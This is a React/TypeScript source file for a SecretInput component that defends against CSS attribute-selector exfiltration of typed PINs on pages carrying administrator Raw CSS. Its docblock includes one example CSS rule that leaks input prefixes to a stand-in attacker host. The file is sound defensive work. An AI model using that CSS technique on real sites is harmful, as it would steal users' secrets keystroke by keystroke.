"use client";

import * as React from "react";

import { Input, type InputProps } from "@/components/ui/input";

/**
 * A text input for a user-entered SECRET on a page that carries administrator
 * Raw CSS (#2981).
 *
 * ## The problem it exists to solve, measured rather than assumed
 *
 * React's controlled-input pattern — `<input value={state} onChange={…}>` — does
 * not only set the DOM `value` **property**. On every update `react-dom` also
 * writes `node.defaultValue`, and `defaultValue` reflects to the `value`
 * **content attribute**. CSS selectors match attributes, so a controlled input
 * publishes whatever the visitor has typed, one character at a time, to any
 * stylesheet on the page:
 *
 *     input#hut-leader-pin[value^="14"] { background: url(https://attacker.example/14); }
 *
 * `(website)` and `(website-dynamic)` inject the club's administrator-authored
 * Raw CSS (`buildClubThemeCss` → `WebsiteChrome`), and a styling administrator is
 * deliberately NOT inside the kiosk-PIN trust boundary — the same boundary
 * argument #2827 made for the group-join payment token. So a controlled secret
 * input on those pages is a live prefix oracle.
 *
 * This was confirmed in real browsers before the fix was written, because jsdom
 * is not evidence about a browser: with React 19.2.8, **Chromium 153, Firefox 155
 * and WebKit 26.6 all mirrored the typed value into the `value` attribute at every
 * keystroke**, `[value^="…"]` matched each growing prefix, and `getComputedStyle`
 * confirmed the CSS engine applied the matched rule. Evidence and method: issue
 * #2981; the permanent regression pin is `e2e/raw-css-secret-reflection.spec.ts`.
 *
 * ## How this component closes it
 *
 * It renders an **uncontrolled** input: neither `value` nor `defaultValue` ever
 * reaches the DOM element, so `react-dom` never writes `defaultValue` and the
 * element carries no `value` attribute at all — before, during or after typing.
 * The live secret exists only as the element's `value` property and in the
 * caller's React state, neither of which a selector can read.
 *
 * Both props are removed by the type (`Omit`), so passing one is a compile error
 * rather than a lint rule — unrepresentable beats policed (`INV-SSOT`). They are
 * also stripped at runtime, because a `{...props}` spread from an `any`-typed
 * source would otherwise reinstate the leak silently.
 *
 * `sanitise` runs against the element's own property, never by feeding a value
 * back down as a prop, so input filtering (digits only, a length cap) keeps
 * working without reintroducing the attribute.
 *
 * Rule, trust boundary and scope: `docs/SECURITY.md` → "Secret entry on pages
 * that carry Raw CSS". The bounded census that keeps this adopted everywhere it
 * is owed: `src/lib/__tests__/raw-css-secret-input-census.test.ts`.
 */
export type SecretInputProps = Omit<
  InputProps,
  "value" | "defaultValue" | "onChange"
> & {
  /** Called with the sanitised value after every edit. */
  onValueChange: (value: string) => void;
  /**
   * Optional input filter, applied to the element's own property. Must be
   * idempotent and must only delete characters (the caret repair below assumes
   * deletions, which is what every credential filter here does: digits only, a
   * length cap).
   */
  sanitise?: (raw: string) => string;
};

/** Input types whose selection API exists (HTML spec). */
const CARET_CAPABLE_TYPES = new Set([
  "text",
  "search",
  "url",
  "tel",
  "password",
]);

export const SecretInput = React.forwardRef<HTMLInputElement, SecretInputProps>(
  function SecretInput({ onValueChange, sanitise, ...rest }, ref) {
    // Defence in depth against an untyped spread: the `Omit` above already makes
    // these a compile error, and this makes the guarantee true even when the
    // types were bypassed. See the docblock — a reinstated `value` prop is the
    // single way this component can start leaking again.
    const attributes = { ...rest } as InputProps;
    delete attributes.value;
    delete attributes.defaultValue;

    return (
      <Input
        {...attributes}
        ref={ref}
        onChange={(event) => {
          const node = event.currentTarget;
          const raw = node.value;
          const next = sanitise ? sanitise(raw) : raw;

          if (next !== raw) {
            // Write the PROPERTY only. Assigning `node.value` never touches the
            // content attribute, which is exactly the distinction this component
            // exists to keep.
            // `selectionStart`/`setSelectionRange` throw on `email`, `number`
            // and a few other input types, so the caret repair is conditional on
            // a type that supports it. A secret field is a text/password field
            // in practice; this only stops a future caller crashing.
            const caretCapable = CARET_CAPABLE_TYPES.has(node.type);
            const caret = caretCapable
              ? (node.selectionStart ?? raw.length)
              : null;
            node.value = next;
            if (caret !== null) {
              const moved = Math.max(0, caret - (raw.length - next.length));
              node.setSelectionRange(
                Math.min(moved, next.length),
                Math.min(moved, next.length),
              );
            }
          }

          onValueChange(next);
        }}
      />
    );
  },
);
